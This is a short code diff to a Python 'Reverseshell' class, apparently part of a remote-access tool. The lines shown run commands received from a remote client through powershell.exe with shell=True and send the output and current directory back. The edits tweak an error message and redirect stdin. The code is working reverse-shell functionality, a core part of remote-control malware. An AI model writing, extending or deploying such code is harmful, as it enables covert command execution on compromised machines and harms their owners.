@@ -24,7 +24,7 @@ class Reverseshell:
                     cmd_result = self.execute_commands(command)
                     client.send_data(cmd_result)
                 except Exception as err:
-                    client.send_data("Unable to execute command some random error occured\n" + str(err))
+                    client.send_data("Unable to execute command some random error occured!\n" + str(err))
             new_pwd = os.getcwd()
             client.send_data(new_pwd)
     
@@ -40,7 +40,7 @@ class Reverseshell:
         display_msg("Executing commands", "g")
         command_list = command.split(" ")
         execute_list = ["powershell.exe"] + command_list
-        output = subprocess.run(execute_list, shell=True, capture_output=True)
+        output = subprocess.run(execute_list, shell=True, capture_output=True, stdin=subprocess.DEVNULL)
         if output.stderr.decode('utf-8') == "":
             cmd_result = (output.stdout.decode('utf-8'))
         else:
